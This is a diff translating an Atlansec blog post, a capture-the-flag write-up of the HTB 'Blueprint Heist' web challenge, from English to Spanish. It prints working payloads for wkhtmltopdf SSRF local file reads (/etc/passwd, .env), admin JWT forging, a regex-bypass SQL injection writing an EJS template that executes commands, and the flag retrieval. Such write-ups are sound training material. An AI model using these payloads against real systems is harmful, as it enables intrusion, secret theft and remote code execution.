@@ -18,7 +18,7 @@
     
     
       
-        <title>Challenge, Train, Flag: Blueprint Heist - Atlansec</title>
+        <title>Reto, Entrenamiento, Bandera: Robo de Planos - Atlansec</title>
       
     
     
@@ -55,11 +55,11 @@
       
         <meta  property="og:type"  content="website" >
       
-        <meta  property="og:title"  content="Challenge, Train, Flag: Blueprint Heist - Atlansec" >
+        <meta  property="og:title"  content="Reto, Entrenamiento, Bandera: Robo de Planos - Atlansec" >
       
         <meta  property="og:description"  content="None" >
       
-        <meta  property="og:image"  content="https://atlansec.es/assets/images/social/en/blog/posts/08-12-2024.png" >
+        <meta  property="og:image"  content="https://atlansec.es/assets/images/social/es/blog/posts/08-12-2024.png" >
       
         <meta  property="og:image:type"  content="image/png" >
       
@@ -71,11 +71,11 @@
       
         <meta  name="twitter:card"  content="summary_large_image" >
       
-        <meta  name="twitter:title"  content="Challenge, Train, Flag: Blueprint Heist - Atlansec" >
+        <meta  name="twitter:title"  content="Reto, Entrenamiento, Bandera: Robo de Planos - Atlansec" >
       
         <meta  name="twitter:description"  content="None" >
       
-        <meta  name="twitter:image"  content="https://atlansec.es/assets/images/social/en/blog/posts/08-12-2024.png" >
+        <meta  name="twitter:image"  content="https://atlansec.es/assets/images/social/es/blog/posts/08-12-2024.png" >
       
     
     
@@ -96,7 +96,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#challenge-train-flag-blueprint-heist" class="md-skip">
+        <a href="#reto-entrenamiento-bandera-robo-de-planos" class="md-skip">
           Saltar a contenido
         </a>
       
@@ -434,64 +434,64 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#what-is-a-ctf" class="md-nav__link">
+  <a href="#que-es-un-ctf" class="md-nav__link">
     <span class="md-ellipsis">
-      What is a CTF?
+      ¿Qué es un CTF?
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#key-concepts" class="md-nav__link">
+  <a href="#conceptos-claves" class="md-nav__link">
     <span class="md-ellipsis">
-      Key concepts
+      Conceptos claves
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#the-challenge" class="md-nav__link">
+  <a href="#el-reto" class="md-nav__link">
     <span class="md-ellipsis">
-      The challenge
+      El Reto
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="The challenge">
+    <nav class="md-nav" aria-label="El Reto">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#understanding-the-application-logic" class="md-nav__link">
+  <a href="#entendiendo-la-logica-de-la-aplicacion" class="md-nav__link">
     <span class="md-ellipsis">
-      Understanding the Application Logic
+      Entendiendo la Lógica de la Aplicación
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#ssrf-to-local-file-read-on-wkhtmltopdf" class="md-nav__link">
+  <a href="#ssrf-para-la-lectura-de-archivos-en-wkhtmltopdf" class="md-nav__link">
     <span class="md-ellipsis">
-      SSRF to local file read on wkhtmltopdf
+      SSRF para la lectura de archivos en wkhtmltopdf
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#jwt-forging" class="md-nav__link">
+  <a href="#falsificacion-del-jwt" class="md-nav__link">
     <span class="md-ellipsis">
-      JWT Forging
+      Falsificación del JWT
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#sql-injection-to-file-upload" class="md-nav__link">
+  <a href="#inyeccion-sql-a-la-subida-del-archivo" class="md-nav__link">
     <span class="md-ellipsis">
-      SQL injection to file upload
+      Inyección SQL a la subida del archivo
     </span>
   </a>
   
@@ -517,39 +517,39 @@
                   
 
 
-<h1 id="challenge-train-flag-blueprint-heist">Challenge, Train, Flag: Blueprint Heist</h1>
-<p>At Atlansec, we are committed to <strong>CTFs as a key learning tool</strong> under the <em>learning by doing</em> methodology. We believe that <strong>facing practical challenges is the best way to develop technical skills</strong> and foster creativity. With this section we want to spread the value of CTFs, share <em>writeups</em> of challenges of a certain technical complexity and bring the community closer to a practical and technical approach to learning.</p>
+<h1 id="reto-entrenamiento-bandera-robo-de-planos">Reto, Entrenamiento, Bandera: Robo de Planos</h1>
+<p>En Atlansec, estamos comprometidos con <strong>los CTFs como una herramienta clave de aprendizaje</strong> bajo la metodología de <em>aprender haciendo</em>. Creemos que <strong>enfrentar retos prácticos es la mejor manera de desarrollar habilidades técnicas</strong> y fomentar la creatividad. Con esta sección queremos difundir el valor de los CTFs, compartir <em>writeups</em> de Retos de cierta complejidad técnica y acercar a la comunidad a un enfoque práctico y técnico del aprendizaje.</p>
 <!-- more -->
 
-<h3 id="what-is-a-ctf">What is a CTF?</h3>
-<p>Capture the Flag (CTF) competitions are cybersecurity challenges where participants tackle a variety of technical problems to find "flags," which are hidden markers proving successful completion of a task. CTFs simulate real-world scenarios in areas like cryptography, reverse engineering, web security, forensics, and binary exploitation, helping participants build essential cybersecurity skills.</p>
-<p>CTFs aren't just competitions; they are a gateway to learning by solving. They teach participants how to think critically, debug complex systems, and adapt under pressure. Each challenge is a story, a puzzle, and a lesson rolled into one.</p>
-<p>In this series, we'll explore notable CTF challenges, dive into their technical solutions, and highlight the skills they develop. Welcome to Challenge, Train, Flag!</p>
-<h2 id="key-concepts">Key concepts</h2>
+<h3 id="que-es-un-ctf">¿Qué es un CTF?</h3>
+<p>Las competiciones de capturar la bandera (CTF) son Retos de ciberseguridad donde los participantes se enfrentan a una serie de problemas técnicos para encontrar "banderas", que son marcadores ocultos que demuestran que se ha completado con éxito una tarea. Los CTFs simulan situaciones de la vida real en áreas como la criptografía, ingeniería inversa, seguridad web, análisis forense y explotación de binarios, ayudando a los participantes a adquirir habilidades esenciales en ciberseguridad.</p>
+<p>Los CTFs no solo son una competición; son la puerta de entrada al aprendizaje mediante la resolución de problemas. Enseñan a los participantes a pensar de forma crítica, a depurar sistemas complejos, y a adaptarse bajo presión. Cada Reto es una historia, un rompecabeza y una lección todo en uno.</p>
+<p>En esta serie, exploraremos Retos CTF notables, nos sumergiremos en sus soluciones técnicas y destacaremos las habilidades que desarrollan. ¡Bienvenido a Reto, Entrenamiento, Bandera!</p>
+<h2 id="conceptos-claves">Conceptos claves</h2>
 <ul>
 <li>
-<p><strong>SSRF (Server-Side Request Forgery):</strong> Technique that allows an attacker to force a server to make HTTP requests on their behalf. Depending on the context, it can be quite critical as it can allow an attacker to access resources within the target's internal network.</p>
+<p><strong>SSRF (Server-Side Request Forgery):</strong> Es una técnica que permite al atacante a forzar a un servidor a realizar peticiones HTTP en su nombre. Dependiendo del contexto, puede ser bastante crítico ya que puede permitir a un atacante acceder a recursos dentro de la red interna del objetivo.</p>
 </li>
 <li>
-<p><strong>JSON Web Token (JWT):</strong> An open standard for authenticating and securely transferring information using a token.</p>
+<p><strong>JSON Web Token (JWT):</strong> Es un estándar abierto para autenticar y transferir información de forma segura utilizando un token.</p>
 </li>
 <li>
-<p><strong>SQL Injection:</strong> An attack that allows malicious SQL code to be injected into a query to manipulate the database query.</p>
+<p><strong>Inyección SQL:</strong> Ataque que permite inyectar código SQL malicioso en una consulta para manipular la consulta de la base de datos.</p>
 </li>
 <li>
-<p><strong>wkhtmltopdf:</strong> Library for converting web content (HTML) to PDF.</p>
+<p><strong>wkhtmltopdf:</strong> Librería para convertir contenido web (HTML) en PDF.</p>
 </li>
 </ul>
-<h2 id="the-challenge">The challenge</h2>
-<p>This time we bring you a challenge from the HTB Business CTF 2024. The challenge is from the web category and although it is listed as easy on the HackTheBox platform, it is one of the most complex web challenges on the platform due to the number of steps that make up the solution.</p>
-<p>In this challenge we are given the source code of a NodeJS application and access to a web service running the application.</p>
-<h3 id="understanding-the-application-logic">Understanding the Application Logic</h3>
-<p>The challenge starts with access to an application of the urban planning commission. When browsing, we notice that clicking on any of the links generates a POST request to the /download path. Let's review its implementation in the routes file:</p>
+<h2 id="el-reto">El Reto</h2>
+<p>En esta ocasión os traemos un reto de HTB Business CTF 2024. El reto es de la categoría web y aunque está catalogado como fácil en la plataforma de HackTheBox, es uno de los retos web más complejos de la plataforma debido al número de pasos que componen la solución.</p>
+<p>En este reto se nos da el código fuente de una aplicación NoseJS y acceso a un servicio web que ejecuta la aplicación.</p>
+<h3 id="entendiendo-la-logica-de-la-aplicacion">Entendiendo la Lógica de la Aplicación</h3>
+<p>El reto comienza con el acceso a la aplicación de la comisión de urbanismo. Al navegar, nos damos cuenta que al pulsar sobre cualquiera de los enlaces se genera una petición POST a la ruta /download. Revisemos su implementación en el archivo de rutas:</p>
 <div class="language-Javascript highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">&quot;/download&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">authMiddleware</span><span class="p">(</span><span class="s2">&quot;guest&quot;</span><span class="p">),</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">,</span><span class="w"> </span><span class="nx">next</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
 </span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">    </span><span class="nx">convertPdf</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">,</span><span class="w"> </span><span class="nx">next</span><span class="p">);</span>
 </span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="p">});</span>
 </span></code></pre></div>
-<p>Here we can see that the <em>convertPdf</em> function is responsible for handling the logic of this path. Let's go on to examine its code:</p>
+<p>Aquí podemos ver que la función <em>convertPdf</em> es la responsable de manejar la lógica de esta ruta. Vamos a examinar su código:</p>
 <div class="language-Javascript highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">convertPdf</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">,</span><span class="w"> </span><span class="nx">next</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 </span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
 </span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">url</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
@@ -565,7 +565,7 @@
 </span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="w">    </span><span class="p">}</span>
 </span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="p">}</span>
 </span></code></pre></div>
-<p>After reading this, we can see that the function makes sure that the parameter it receives is a valid URL before passing it to the <em>generatePdf</em> function. Let's look at the latter next:</p>
+<p>Después de leerlo, podemos ver que la función se asegura que el parámetro que recibe es una URL válida antes de pasarla a la función <em>generatePdf</em>. Veamos esto último:</p>
 <div class="language-Javascript highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">generatePdf</span><span class="p">(</span><span class="nx">urls</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 </span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">pdfFilename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">generateRandomFilename</span><span class="p">();</span>
 </span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">pdfPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`uploads/</span><span class="si">${</span><span class="nx">pdfFilename</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
@@ -590,72 +590,73 @@
 </span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a><span class="w">    </span><span class="p">});</span>
 </span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a><span class="p">}</span>
 </span></code></pre></div>
-<p>We note that the <em>generatePdfFromUrl</em> function uses <em>wkhtmltopdf</em> to convert the URL content to a PDF file. This flow opens the door to exploit a <strong>SSRF vulnerability</strong> in the library.</p>
-<h3 id="ssrf-to-local-file-read-on-wkhtmltopdf">SSRF to local file read on wkhtmltopdf</h3>
-<p>Using an attacker-controlled server, we can serve files on a web server to redirect the visitor to local file system locations, in this case converting the SSRF on the server into a way to read internal files such as /etc/passwd. To do this, we create a PHP file with the following content:</p>
+<p>Observamos que la función <em>generatePdfFromUrl</em> usa <em>wkhtmltopdf</em> para convertir el contenido de la URL en un archivo PDF. Este flujo abre la puerta a una <strong>vulnerabilidad SSRF</strong> en la librería.</p>
+<h3 id="ssrf-para-la-lectura-de-archivos-en-wkhtmltopdf">SSRF para la lectura de archivos en wkhtmltopdf</h3>
+<p>Utilizando un servidor controlado por el atacante, podemos servir archivos en un servidor web para redirigir al visitante a ubicaciones locales en el sistema de archivos, en este caso convirtiendo el SSRF en una forma de leer archivos internos como /etc/passwd. Para hacer esto, creamos un archivo PHP con el siguiente contenido:</p>
 <div class="language-php highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="cp">&lt;?php</span> <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;location:file:///etc/passwd&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
 </span></code></pre></div>
-<p>By passing the URL of our server as a parameter to the /download path, the generated PDF will contain the contents of the /etc/passwd file of the server making the request.</p>
+<p>Al pasar la URL de nuestro servidor como parámetro a la ruta /download, el PDF generado contendrá el contenido del archivo /etc/passwd del servidor que realiza la petición.</p>
 <figure>
-    <img alt="Reading /etc/passwd with the PDF generator" src="../../../../assets/posts/2024/12/08/etc_passwd.png" />
-  <figcaption>Reading /etc/passwd with the PDF generator</figcaption>
+    <img alt="Leyendo el /etc/passwd con el generador de PDF" src="../../../../assets/posts/2024/12/08/etc_passwd.png" />
+  <figcaption>Leyendo el /etc/passwd con el generador de PDF</figcaption>
 </figure>
-<p>We then modify the PHP file to exfiltrate the application's .env file:</p>
+<p>A continuación, modificamos el archivo PHP para exfiltar el archivo .env de la aplicación:</p>
 <div class="language-php highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="cp">&lt;?php</span> <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;location:file:///app/.env&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
 </span></code></pre></div>
 <figure>
-    <img alt="Reading env file with the PDF generator" src="../../../../assets/posts/2024/12/08/env_file.png" />
-  <figcaption>Reading env file with the PDF generator</figcaption>
+    <img alt="Leyendo el archivo .env con el generador de PDF" src="../../../../assets/posts/2024/12/08/env_file.png" />
+      <figcaption>Leyendo el archivo .env con el generador de PDF</figcaption>
 </figure>
-<h3 id="jwt-forging">JWT Forging</h3>
-<p>With the key extracted from the .env file, we can sign valid JWT tokens. We use a tool like <a href="https://jwt.io/">JWT.io</a> to generate a token with the administrator role:</p>
+<h3 id="falsificacion-del-jwt">Falsificación del JWT</h3>
+<p>Con la clave extraída del archivo .env, podemos firmar tokens JWT válidos. Usamos una herramienta como <a href="https://jwt.io/">JWT.io</a> para generar el token con el rol de administrador:</p>
 <div class="language-json highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="p">{</span>
 </span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">  </span><span class="nt">&quot;role&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;admin&quot;</span>
 </span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="p">}</span>
 </span></code></pre></div>
 <figure>
-    <img alt="Edit JWT token on JWT.io" src="../../../../assets/posts/2024/12/08/jwt_io.png" />
-  <figcaption>Edit JWT token on JWT.io</figcaption>
+    <img alt="Editar token JWT en JWT.io" src="../../../../assets/posts/2024/12/08/jwt_io.png" />
+      <figcaption>Editar token JWT en JWT.io</figcaption>
 </figure>
-<p>Using the token we have generated, we will make a request to the internal admin panel endpoint with the following structure:</p>
+<p>Usando el token que hemos generado, haremos una petición al endpoint interno del panel de administración con la siguiente estructura:</p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>http://127.0.0.1:1337/admin?token=&lt;JWT_admin&gt;
 </span></code></pre></div>
-<p>In the generated PDF we can see the contents of the admin panel.  While this generates a screenshot of the admin panel, it only takes us halfway to our ultimate goal.</p>
+<p>En el PDF generado podemos ver el contenido del panel de administración. Aunque esto genera una captura de pantalla del panel de administración, sólo nos lleva la mitad del camino de nuestro objetivo final.</p>
 <figure>
-    <img alt="PDF with the content of the admin panel" src="../../../../assets/posts/2024/12/08/admin_panel_pdf.png" />
-  <figcaption>PDF with the content of the admin panel</figcaption>
+  <img alt="PDF con el contenido del panel de administración" src="../../../../assets/posts/2024/12/08/admin_panel_pdf.png" />
+    <figcaption>PDF con el contenido del panel de administración</figcaption>
 </figure>
-<h3 id="sql-injection-to-file-upload">SQL injection to file upload</h3>
-<p>Analysing the rest of the application code, we discovered that the GraphQL endpoint is vulnerable to SQL injection in the <em>getDataByName</em> query. However, a robust regular expression is used to filter out malicious entries:</p>
+<h3 id="inyeccion-sql-a-la-subida-del-archivo">Inyección SQL a la subida del archivo</h3>
+<p>Analizando el resto del código de la aplicación, descubrimos que el endpoint GraphQL es vulnerable a Inyección SQL en la consulta <em>getDataByName</em>. Sin embargo, se utiliza una expresión regular robusta para filtrar las entradas maliciosas:</p>
 <div class="language-Javascript highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="kd">function</span><span class="w"> </span><span class="nx">detectSqli</span><span class="p">(</span><span class="nx">query</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 </span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">pattern</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/^.*[!#$%^&amp;*()\-_=+{}\[\]\\|;:&#39;\&quot;,.&lt;&gt;\/\?]/</span><span class="p">;</span>
 </span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">pattern</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">query</span><span class="p">);</span>
 </span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="p">}</span>
 </span></code></pre></div>
-<p>A more detailed analysis shows that the expression is not multiline, which allows us to bypass it with a line break (<code>n</code>).</p>
+<p>Un análisis más detallado muestra que la expresión no es multilínea, lo que nos permite realizar un bypass con un salto de línea (<code>n</code>).</p>
 <ul>
-<li>No line break.</li>
+<li>Sin salto de línea.</li>
 </ul>
 <figure>
-    <img alt="The regex match our payload" src="../../../../assets/posts/2024/12/08/regex_match.png" />
-  <figcaption>The regex match our payload</figcaption>
+    <img alt="La expresión regular coincide con nuestro payload" src="../../../../assets/posts/2024/12/08/regex_match.png" />
+      <figcaption>La expresión regular coincide con nuestro payload</figcaption>
 </figure>
 <ul>
-<li>With a line break.</li>
+<li>Con salto de línea.</li>
 </ul>
 <figure>
-    <img alt="The regex doesn´t match our payload" src="../../../../assets/posts/2024/12/08/regex_not_match.png" />
-  <figcaption>The regex doesn´t match our payload</figcaption>
+    <img alt="La expresión regular no coincide con nuestro payload" src="../../../../assets/posts/2024/12/08/regex_not_match.png" />
+      <figcaption>La expresión regular no coincide con nuestro payload</figcaption>
 </figure>
-<p>Once this is discovered, we can build a payload for an SQL injection that writes a malicious EJS file to the 404 error path, since the application does not have a path to handle this type of error.</p>
-<p>The payload we build should be similar to the following, where we include an EJS template that reads the flag by executing the target binary.</p>
+<p>Una vez descubierto esto, podemos construir un payload para una inyección SQL que escriba un archivo EJS malicioso en la ruta de error 404, ya que la aplicación no tiene una ruta para manejar este tipo de error.</p>
+<p>El payload que construimos debería ser similar al siguiente, donde incluimos la plantilla EJS que leer la bandera ejecutando el binario objetivo.</p>
 <div class="language-SQL highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="s1">&#39; UNION SELECT 1, &#39;</span><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;&lt;%=</span><span class="w"> </span><span class="n">process</span><span class="p">.</span><span class="n">mainModule</span><span class="p">.</span><span class="n">require</span><span class="p">(</span><span class="ss">&quot;child_process&quot;</span><span class="p">).</span><span class="n">execSync</span><span class="p">(</span><span class="ss">&quot;/readflag&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">%&gt;&lt;/</span><span class="n">p</span><span class="o">&gt;</span><span class="s1">&#39;, 2, 3 INTO OUTFILE &#39;</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">views</span><span class="o">/</span><span class="n">errors</span><span class="o">/</span><span class="mi">404</span><span class="p">.</span><span class="n">ejs</span><span class="err">&#39;</span><span class="c1">--</span>
 </span></code></pre></div>
-<p>With the malicious file in place, we access a non-existent path to throw a 404 error and execute the /readflag command. This gives us access to the contents of the flag.</p>
+<p>Con el archivo malicioso en su lugar, accedemos a la ruta inexistente lanzando un error 404 y ejecutando el comando /readflag. Esto nos da acceso al contenido de la bandera.</p>
 <figure>
-    <img alt="Reading the flag" src="../../../../assets/posts/2024/12/08/flag.png" />
-  <figcaption>Reading the flag</figcaption>
+    <img alt="Lectura de la bandera" src="../../../../assets/posts/2024/12/08/flag.png" />
+  <figcaption>Lectura de la bandera</figcaption>
 </figure>
+<hr />
 
 
 
